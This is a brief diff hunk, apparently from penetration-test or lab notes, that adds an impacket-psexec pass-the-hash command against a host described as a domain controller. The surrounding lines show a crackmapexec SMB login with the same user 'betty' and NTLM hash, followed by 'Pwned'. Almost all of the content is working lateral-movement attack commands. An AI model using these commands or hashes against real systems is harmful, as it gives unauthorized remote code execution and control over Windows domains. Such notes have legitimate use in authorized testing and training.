@@ -116,6 +116,9 @@ crackmapexec smb 192.168.102.100 -u betty -H fa680f1c00205958367965bd2102e92c
 Pwned
 accessed DC using impacket-psexec
 
+impacket-psexec -hashes 00000000000000000000000000000000:fa680f1c00205958367965bd2102e92c betty@192.168.102.100
+
+
 
 
 
